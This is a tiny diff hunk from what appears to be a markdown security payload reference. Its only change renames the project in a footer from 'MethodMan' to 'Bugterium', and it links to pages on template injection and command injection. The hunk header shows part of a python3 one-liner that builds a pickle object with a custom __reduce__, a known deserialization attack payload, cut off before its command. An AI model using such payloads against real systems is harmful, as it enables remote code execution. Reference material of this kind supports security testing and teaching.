@@ -691,6 +691,6 @@ python3 -c 'import pickle, os; print(pickle.dumps(type("E",(),{"__reduce__":lamb
 
 ---
 
-*Part of MethodMan. English only by design. Last updated: 2026-10-14.*
+*Part of Bugterium. English only by design. Last updated: 2026-10-14.*
 
 > See also: [SSTI.md](./SSTI.md), [Command-Injection.md](./Command-Injection.md)
